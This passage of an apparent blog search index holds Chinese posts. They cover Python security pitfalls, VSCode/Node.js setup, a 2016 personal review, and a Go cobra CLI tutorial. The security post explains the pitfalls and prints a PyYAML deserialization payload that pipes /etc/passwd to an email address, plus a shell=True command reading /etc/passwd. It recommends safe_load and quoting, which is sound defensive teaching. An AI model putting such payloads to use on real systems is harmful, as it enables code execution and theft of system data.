Y)True&gt;&gt;&gt; 对抗恶意猴子补丁的唯一处理措施是保证导入的 Python 模块的真实性和完整性, 一个简单的方法是使用__slot__来保护自己的类不被注入攻击,但是这又丧失了一些灵活性。 通过subprocess进行shell注入以胶水语言著称，对Python脚本来说，通过让操作系统来执行它们，可能还提供额外的参数，来委派系统管理任务给其他程序，是非常常见的。subprocess模块为这样的任务提供了易于使用和相当高层次的服务。12345&gt;&gt;&gt; from subprocess import call&gt;&gt;&gt; call('date')2017年 1月10日 星期二 13时11分53秒 CST0&gt;&gt;&gt; 但有一个陷阱！要利用UNIX shell服务，例如命令行参数扩展，call函数的shell关键字参数应该设置为True。然后原样传递call函数的第一个参数给系统shell，用以进一步的解析。一旦无效的用户输入到达call函数(或者其他在 subprocess 模块中实现的函数)，那么就会开放一个口给底层系统资源。12345&gt;&gt;&gt; call('cut -d: -f1 /etc/passwd', shell=True)nobodyrootdaemon... 显然，将shell关键字保持默认值False，并且提供命令及其参数的数组给subprocess函数，不要为外部命令执行调用UNIX shell，这样会安全得多。在这第二次调用格式，命令或者它的参数都不会被shell解析或展开。如果应用的本质决定了使用UNIX shell服务，那么清理一切到 subprocess的参数，确保没有不想要的shell功能可以被恶意用户利用，这完全是重要的。在更新的Python版本中，可以用标准库的shlex.quote函数来进行shell转义。 序列化-pyYAML作为一个流行的配置文件格式，YAML不一定被认为是一个能够诱使反序列化器执行任意代码的强大的序列化协议。让它甚至更危险的是，事实上Python的YAML默认实现—-PyYAML让反序列化看起来非常无辜：1234567&gt;&gt;&gt; dangerous_input = """... some_option: !!python/object/apply:subprocess.call... args: [cat /etc/passwd | mail 719118794@qq.com]... kwds: &#123;shell: true&#125;... """&gt;&gt;&gt; yaml.load(dangerous_input)&#123;'some_option': 0&#125; 而/etc/passwd已经被窃取了。一个建议的解决方法是总是使用 yaml.safe_load来处理那些你不信任的YAML序列化。尽管如此，目前的PyYAML默认感觉有些驱使人考虑其他倾向于为相似的目的使用 dump/ load函数名（但是以一种安全的方式的序列化库]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[使用VSCode快速搭建NodeJS开发环境]]></title>
      <url>%2F2017%2F01%2F01%2Fnodejs-vscode%2F</url>
      <content type="text"><![CDATA[文本的目的是快速搭建NodeJS的开发环境，NodeJS的常见的开发方式有2种，一种是编辑器，一种是IDE。编辑器推荐使用微软出品的vscdoe，因为其启动速度快，轻量级，执行简单，调试方便，还有界面漂亮。而IDE 无可厚非的就是WebStorm了。这里使用vscdoe搭建开发环境，因为IDE真的比较耗内存。除非开发大型项目,否则轻易我不开IDE。 VSCode简介VSCode全称是Visual Studio Code, 由微软出品,但它不是那个大块头的Visual Studio ,它是一个精简版的迷你Visual Studio，并且，Visual Studio Code可以跨！平！台！Windows、Mac和Linux通用。 安装VSCode可以通过官方下载, 由于你我都懂的原因，可能无法访问，因此你可能会需要使用国内镜像,直接下mac版本的安装包，安装。 运行在VS Code中，我们可以非常方便地运行JavaScript文件。 VS Code以文件夹作为工程目录（Workspace Dir），所有的JavaScript文件都存放在该目录下。此外，VS Code在工程目录下还需要一个.vscode的配置目录，里面存放里VS Code需要的配置文件。 假设我们要创建一个hello的工程，因此我需要一个hello的目录作为工程目录，然后在里面编写hello.js文件，则该工程目录的结构如下：1234567hello/ &lt;-- workspace dir|+- hello.js &lt;-- JavaScript file|+- .vscode/ &lt;-- VS Code config | +- launch.json &lt;-- VS Code config file for JavaScript 然后切换到debug模式进行运行，关于debug模式后面介绍。对于更细节相关的文档可以参考微软官方提供的JavaScript in VS Code 智能提示因为之前微软推出了typescript语言，结合tsd文件，用visual studio写typescript代码是相当爽的，智能提示的功能非常nb。 这个功能理所应当也被vscode继承了，但是现在tsd项目已经过期了，接过这个接力棒的是typings 因此我们将通过Typings来实现JavaScript智能提示功 注意事项 安装NPM NPM是和Node.js一起安装的，如果你想使用NPM的话，那么你应该先安装Node.js Typings vs TSD Typings作为TSD的替代者而出现的，如果你已经安装了TSD，那么需要知道现在TSD已经不推荐使用了。如果已经安装TSD请执行下面的命令来移除它1npm rm -g tsd CNPM 在国内由于墙的原因，大部分时候使用NPM安装模块的速度上会很慢，这时候我们其实可以选择国内淘宝的NPM镜像，关于淘宝NPM镜像的使用方法可以参考淘宝 NPM 镜像 使用下面的命令来进行安装和使用12npm install -g cnpm --registry=https://registry.npm.taobao.orgcnpm install koa 安装Typings我们通过cnpm来安装typings1234maojun@maojun-mbp$ npm install -g typingsmaojun@maojun-mbp$ typings -v2.0.0 配置智能提示安装完成后，我们需要安装相应的需要提示功能库或者框架的类型信息文件，在这里我们新建一个文件夹 NodeSnippet，为了了解Typings的使用方法，你可能需要简单看看typings github 使用命令行进入到该目录中，分别输入下面两个命令来安装Node和Lodash的类型接口信息文件：12typings install dt~node --global --savetypings install lodash --save 这时候我们可以看到我们的 NodeSnippet目录中多了一些文件：12345678910111213 maojun@maojun-mbp$ tree ..├── typings│ ├── globals│ │ └── node│ │ ├── index.d.ts│ │ └── typings.json│ ├── index.d.ts│ └── modules│ └── lodash│ ├── index.d.ts│ └── typings.json└── typings.json 这些文件就是为我们提供提示信息的类型类型文件(使用TypeScript定义)。查看Typings是否支持某个库或框架的智能提示，我们可以使用下面的命令:1typings search exampleName 启动智能提示配置好了类型接口后，可以通过两种方式来启动提示功能： 文件头加注释 1/// &lt;reference path="./typings/index.d.ts" /&gt; 在目录(在这里是NodeSnippet文件夹中)增加一个名为jsconfig.json的空文件 更多jsconfig.json文件的内容可以参考： JavaScript in VS Code 这样我们写代码的时候就有智能提示功能了， 效果如下: 调试如何调试写好了的JS程序喃？ 用VS Code快速创建launch.json文件, 主要是修改program这个参数，指明你 可执行文件位置。 关于Debug的细节，请参考Debugging 123456789101112131415161718192021&#123; // Use IntelliSense to learn about possible Node.js debug attributes. // Hover to view descriptions of existing attributes. // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387 "version": "0.2.0", "configurations": [ &#123; "type": "node", "request": "launch", "name": "启动程序", "program": "$&#123;workspaceRoot&#125;/app.js", "cwd": "$&#123;workspaceRoot&#125;" &#125;, &#123; "type": "node", "request": "attach", "name": "附加到进程", "port": 5858 &#125; ]&#125; 效果如下:]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[2016总结与2017计划]]></title>
      <url>%2F2016%2F12%2F31%2F2016-summary%2F</url>
      <content type="text"><![CDATA[孔子曰:”吾日三省吾身”, 平时很少会静下心来反省和总结一段时间的功与过, 2016马上就要过去了，在这一年将要结束之时, 还是想回过一下这一年来的得与失, 顺便安排下来年的计划。 记录下这一年来自己的变化, 同时也为来年再战作准备, 而且我这人记性不好, 留个底,照亮自己需要走的路。 转瞬即逝的20162016是繁忙的一年，工作上处处充满挑战，有些挑战是自己喜欢的，有些挑战也是自己比较抵触的，我喜欢开发，从运维开发转而参与大型系统开发，这的确是一个不小的挑战，我是一个对技术有点激情的人，因此这个挑战对我而言还是比较喜欢的。后来同时做起了产品设计, 每天扣脑袋, 看别人的产品，画产品设计图， 这些在当时的我是很抵触的, 当时我还处于单纯的想积累技术的阶段。现在看来这段经历也是我宝贵的财富, 毕竟产品决定东西的价值，用再牛叉的技术,做一个没有价值的东西, 这是一件愚蠢的行为，我这里说的价值是长远价值，而不是当下看起来有价值, 这个说起来很悬，以后有机会深入讨论这个。 2016这一年也在和JumpServer一同成长的一年，感触也蛮多的，首先是技术的成长，一个开源产品的技术的迭代，我们致力于设计NB的产品和写出漂亮的代码。其次为有可能的融资谈判而兴奋过，然而最后还是平静下来, 慢慢做一个自己认可的能力范围之内的产品。 工作上的事儿, 总是有那么点紧绷, 其实生活上也有很多值得高兴的事儿，我们有了自己的房子，并且搬进去了，告别了租房的日子，这一切多谢我的老婆打理，我基本是啥心都没操过。其次，我女儿和我关系也很不错，虽然她生气的时候只找她妈妈，但是我在她心中的地位也仅次于她妈妈，我也心有愧疚，作为一个父亲我陪伴她的时候是有点少了。还有我的好搭档，在我最需要钱的时候, 一身不吭的直接转我支付宝上,人生中能交到一个这样的朋友，是我的莫大的荣幸。 还有一个事儿，我终于用上Mac了，虽然是一个二手的MBP，但是这对满足一个屌丝的虚荣心完全受用了, 说岔了, 我再也不用在Windows上装Ubuntu开发了。 瞬息万变的2017变化和革新是很快的, 比如OpenStack没有那么热了, 容器技术也基本成了开发的必备技能, 无论你作为一个前端开发还是后端开发JavaScript都快成为一门必备语言了。前后端的完全分离也愈演愈烈, 各种前段框架的变化。伴随而来的是微服务+容器技术的紧密结合。在最后DDD也随着微服务的出现，对开发人员提出了更高的需求, 以后那种只会写代码的人将愈来愈少了。 我Hold不住这些，因此在技术方面我仅能列出我需要提升的书单: Python提升书单(今年主力) 基础回过 廖雪峰官网 Think Python 2ed 中译版精校 PDF 电子书 进阶深 python3-cookbook 电子书Python高手之路 常见的一些代码实现 python实例手册 网站上的文章 设计模式 快速版大话设计模式 一些最新的例子 精通Python设计模式 数据结构与算法 快速阅读总结 电子书：Data Structures and Algorithms with Python-2015 源码阅读 Django Class Based View Flask 源码阅读 Openstack KeyStone 源码阅读 理解Python解释器 用Python实现一个Python解释器 Golang提升书单 回过基础： Go Web 编程 Go入门指南 JavaScript提升书单 回过基础： 廖雪峰官网 阮一峰的javascript教程 ECMAScript 6 入门 除了技术, 还应该有生活。而生活就是: 赶紧把账还完]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[如何使用golang编写漂亮的命令行工具]]></title>
      <url>%2F2016%2F12%2F30%2Fgo-cobra%2F</url>
      <content type="text"><![CDATA[无论是Openstack还是Docker都有一个漂亮的命令行工具，Openstack的命令行工具主要使用的是Python的argparse库，至于Docker的CLI的实现还没看，但是今天看到了一个在Golang中 用于构建像Docker命令行风格的一个库:cobra cobra简介Cobra既是一个用来创建强大的现代CLI命令行的golang库，也是一个生成程序应用和命令行文件的程序。它提供的功能有： 简易的子命令行模式，如 app server， app fetch等等 完全兼容posix命令行模式 嵌套子命令subcommand 支持全局，局部，串联flags 使用Cobra很容易的生成应用程序和命令，使用cobra create appname和cobra add cmdname 如果命令输入错误，将提供智能建议，如 app srver，将提示srver没有，是否是app server 自动生成commands和flags的帮助信息 自动生成详细的help信息，如app help 自动识别-h，–help帮助flag 自动生成应用程序在bash下命令自动完成功能 自动生成应用程序的man手册 命令行别名 自定义help和usage信息 可选的紧密集成的viper apps 从功能上看完全超越了argparse， 下面将做一个简单的测试，体验下cobra的强大 安装安装cobra需要翻墙，我的环境是Mac，使用ss + polipo来提供https的方向代理。我的代理端口在8123,所以命令行是这样的1$https_proxy=localhost:8123 go get -v github.com/spf13/cobra/cobra 安装完成后可以看到cobra的一些帮助信息1234567891011121314151617181920maojun@maojun-mbp$ cobra -hCobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: cobra [command]Available Commands: add Add a command to a Cobra Application init Initialize a Cobra ApplicationFlags: -a, --author string Author name for copyright attribution (default "YOUR NAME") --config string config file (default is $HOME/.cobra.yaml) -l, --license license Name of license for the project (can provide license in config) -b, --projectbase string base project directory, e.g. github.com/spf13/ --viper Use Viper for configuration (default true)Use "cobra [command] --help" for more information about a command. 使用接下来将使用cobra构建一个不带子命令的CLI和带子命令的CLI 初始化我们可以通过cobra提供的init命令来生成CLI的框架代码，因此切换到GOPATH/src下面,初始CLI框架12345maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]` 这个命令会帮你生成这样一个框架代码123456 maojun@maojun-mbp$ tree demodemo├── LICENSE├── cmd│ └── root.go└── main.go 简单的CLI在写一些简单的CLI的时候我们其实是不需要有子命令的，我们往往需要这样一种简单的CLI12345678910demo.exeDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -h, --help help for demo -n, --name string person's name 接下来我们就在上面生成的代码的基础上完成一个不带子命令的CLI。首先，我需要编写我的业务逻辑，因此我在demo下面新建一个包，名称为simple。如下：123456789maojun@maojun-mbp$ tree ..├── LICENSE├── cmd│ └── root.go├── main.go└── simple ├── simple.go └── simple_test.go 这里仅仅实现一个print作为样例,因此simple.go是这样实现的123456789package simpleimport ( "fmt")func Show(name string, age int) &#123; fmt.Printf("My name is %s, my age is %d\n", name, age)&#125; 接下来我们需要将我们实行的整个Show方法暴露给CLI, 我们从生成的main文件入手分析。 在main里面调用了 demo/cmd包里面暴露的Execute 函数 [cmd.Execute()] 在demo/cmd/root.go中发现Execute执行的是RootCmd.Execute() 而RootCmd是一个cobra的Command结构体[RootCmd = &amp;cobra.Command]显然我们想要实行不带子命令的CLI，只需要将RootCmd的修改成我们需要的结构体就ok了 这里做了几点修改 RootCmd中的Command结构体中的Run方法需要我们定义， 主要功能就是调用simple里面的Show接口 cmd包初始化得时候需要通过RootCmd.Flags()获取命令行传入的name和age的参数，因此这里需要修改init方法 最后我们不需要从配置文件读取配置，注释掉：nitConfig函数和”github.com/spf13/viper” 最终这个root.go是这样的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "os" "demo/simple" "github.com/spf13/cobra" // "github.com/spf13/viper")//var cfgFile stringvar name stringvar age int// RootCmd represents the base command when called without any subcommandsvar RootCmd = &amp;cobra.Command&#123; Use: "demo", Short: "A test demo", Long: `Demo is a test appcation for print things`,// Uncomment the following line if your bare application// has an action associated with it: Run: func(cmd *cobra.Command, args []string) &#123; if len(name) == 0 &#123; cmd.Help() return &#125; simple.Show(name, age) &#125;,&#125;// Execute adds all child commands to the root command sets flags appropriately.// This is called by main.main(). It only needs to happen once to the rootCmd.func Execute() &#123; if err := RootCmd.Execute(); err != nil &#123; fmt.Println(err) os.Exit(-1) &#125;&#125;func init() &#123; // cobra.OnInitialize(initConfig) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags, which, if defined here, // will be global for your application. // RootCmd.PersistentFlags().StringVar(&amp;cfgFile, "config", "", "config file (default is $HOME/.demo.yaml)") // Cobra also supports local flags, which will only run // when this action is called directly. // RootCmd.Flags().BoolP("toggle", "t", false, "Help message for toggle") RootCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") RootCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125;// // initConfig reads in config file and ENV variables if set.// func initConfig() &#123;// if cfgFile != "" &#123; // enable ability to specify config file via flag// viper.SetConfigFile(cfgFile)// &#125;// viper.SetConfigName(".demo") // name of config file (without extension)// viper.AddConfigPath("$HOME") // adding home directory as first search path// viper.AutomaticEnv() // read in environment variables that match// // If a config file is found, read it in.// if err := viper.ReadInConfig(); err == nil &#123;// fmt.Println("Using config file:", viper.ConfigFileUsed())// &#125;// &#125; 最后测试下是不是我们想要的效果1234567891011maojun@maojun-mbp$ go run main.go -hDemo is a test appcation for print thingsUsage: demo [flags]Flags: -a, --age int person's age -n, --name string persion's namemaojun@maojun-mbp$ go run main.go -n "test" -a 10My name is test, my age is 10 带子命令的CLI对于复杂的情况，往往需要带子命令场景，比如Docker的CLI，而最终的效果应该是这样的12345678910111213141516demoDemo is a test appcation for print thingsUsage: demo [flags] demo [command]Available Commands: test A brief description of your commandFlags: -a, --age int person's age -h, --help help for demo -n, --name string person's nameUse "demo [command] --help" for more information about a command. 支持子命令是cobra的自己的功能，因此直接可以通过cobra生成带子命令的代码12345678maojun@maojun-mbp$ cobra init demoYour Cobra application is ready at/Users/maojun/GoWorkDir/src/demoGive it a try by going there and running `go run main.go`Add commands to it by running `cobra add [cmdname]`maojun@maojun-mbp$ cobra add testtest created at /Users/maojun/GoWorkDir/src/cmd/test.go 注释掉root.go那些不需要的地方, 然后修改生成的test.go12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455// Copyright © 2016 NAME HERE &lt;EMAIL ADDRESS&gt;//// Licensed under the Apache License, Version 2.0 (the "License");// you may not use this file except in compliance with the License.// You may obtain a copy of the License at//// http://www.apache.org/licenses/LICENSE-2.0//// Unless required by applicable law or agreed to in writing, software// distributed under the License is distributed on an "AS IS" BASIS,// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.// See the License for the specific language governing permissions and// limitations under the License.package cmdimport ( "fmt" "github.com/spf13/cobra")var name stringvar age int// testCmd represents the test commandvar testCmd = &amp;cobra.Command&#123; Use: "test", Short: "A brief description of your command", Long: `A longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.`, Run: func(cmd *cobra.Command, args []string) &#123; // TODO: Work your own magic here fmt.Printf("My name is %s, my age is %d\n", name, age) &#125;,&#125;func init() &#123; RootCmd.AddCommand(testCmd) // Here you will define your flags and configuration settings. // Cobra supports Persistent Flags which will work for this command // and all subcommands, e.g.: // testCmd.PersistentFlags().String("foo", "", "A help for foo") // Cobra supports local flags which will only run when this command // is called directly, e.g.: testCmd.Flags().StringVarP(&amp;name, "name", "n", "", "persion's name") testCmd.Flags().IntVarP(&amp;age, "age", "a", 0, "person's age")&#125; 最后测试下是不是我们想要的效果 12345678910111213141516171819202122232425262728293031323334353637383940maojun@maojun-mbp$ go run main.go -hA longer description that spans multiple lines and likely containsexamples and usage of using your application. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo [command]Available Commands: test A brief description of your commandFlags: --config string config file (default is $HOME/.demo.yaml) -t, --toggle Help message for toggleUse "demo [command] --help" for more information about a command.maojun@maojun-mbp$ go run main.go test -hA longer description that spans multiple lines and likely contains examplesand usage of using your command. For example:Cobra is a CLI library for Go that empowers applications.This application is a tool to generate the needed filesto quickly create a Cobra application.Usage: demo test [flags]Flags: -a, --age int person's age -n, --name string persion's nameGlobal Flags: --config string config file (default is $HOME/.demo.yaml) maojun@maojun-mbp$ go run main.go test -a 10 -n testMy name is test, my age is 10 命令行补全，man这些可以自己手动测试]]></content>
    </entry>

    
  
  
</search>
